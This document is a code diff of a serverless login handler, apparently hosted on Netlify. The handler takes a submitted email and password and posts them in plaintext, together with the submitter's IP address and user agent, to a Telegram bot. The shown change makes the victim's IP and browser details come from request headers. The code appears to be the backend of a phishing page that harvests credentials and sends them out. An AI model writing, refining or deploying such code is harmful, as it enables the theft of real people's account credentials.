@@ -16,12 +16,16 @@ exports.handler = async (event) => {
     return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Invalid JSON' }) };
   }
 
-  const { email, password, userAgent, clientIp } = body;
+  const { email, password } = body;
   if (!email || !password) {
     return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Missing email or password' }) };
   }
 
-  const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent || 'unknown'}\nIP Address: ${clientIp || 'unknown'}`;
+  // Extract real IP and user agent from Netlify headers
+  const clientIp = event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown';
+  const userAgent = event.headers['user-agent'] || 'unknown';
+
+  const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent}\nIP Address: ${clientIp}`;
 
   try {
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
